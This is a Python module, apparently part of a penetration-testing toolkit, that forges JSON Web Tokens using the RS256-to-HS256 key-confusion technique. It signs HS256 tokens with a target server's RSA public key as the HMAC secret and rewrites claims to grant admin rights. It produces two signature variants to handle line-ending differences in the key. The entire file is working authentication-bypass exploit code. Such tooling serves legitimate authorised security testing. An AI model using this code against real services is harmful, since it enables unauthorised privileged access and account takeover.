"""
Execution logic for JWT RS256->HS256 key-confusion signature bypass
differential testing. Reuses jwt_analyze's own public claim-decoding and
differential-request helpers directly -- this is the same attack shape,
just a different forged token: HS256, signed with the server's own
RS256 public key used as the HMAC secret, instead of alg=none. No
parsing here -- that's parse.py's job.
"""
from __future__ import annotations

import base64
import copy
import hashlib
import hmac
import json
from typing import Any, Dict, Tuple

from tradecraft.adapters.jwt_analyze.execute import decode_jwt_claims, run_differential  # noqa: F401

__all__ = ["decode_jwt_claims", "run_differential", "forge_hs256_confusion_tokens"]


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _apply_privilege_escalation(payload: Dict[str, Any]) -> Dict[str, Any]:
    """Identical heuristic to jwt_analyze.forge_none_alg_token's, kept
    local here since this tool signs a real HMAC instead of leaving the
    signature empty."""
    p = copy.deepcopy(payload)
    if "role" in p:
        p["role"] = "admin"
    if "admin" in p:
        p["admin"] = True
    if "user" in p and "admin" not in str(p.get("user", "")):
        p["user"] = "admin"
    return p


def _sign_hs256(header: Dict[str, Any], payload: Dict[str, Any], key_bytes: bytes) -> str:
    h = copy.deepcopy(header)
    h["alg"] = "HS256"
    h_b64 = _b64url_encode(json.dumps(h, separators=(",", ":")).encode("utf-8"))
    p_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    signature = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{_b64url_encode(signature)}"


def forge_hs256_confusion_tokens(header: Dict[str, Any], payload: Dict[str, Any], public_key: str) -> Tuple[str, str]:
    """Returns (token_exact_pem, token_normalized_pem) -- two signing
    variants, capped at exactly these two: the PEM exactly as given,
    and the same PEM with line endings normalized to '\\n' only. The
    HMAC signs over the key's raw bytes, so CRLF vs LF changes the
    signature even though the key material is 'the same' PEM."""
    forged_payload = _apply_privilege_escalation(payload)
    exact = _sign_hs256(header, forged_payload, public_key.encode("utf-8"))
    normalized_key = public_key.replace("\r\n", "\n").replace("\r", "\n")
    normalized = _sign_hs256(header, forged_payload, normalized_key.encode("utf-8"))
    return exact, normalized
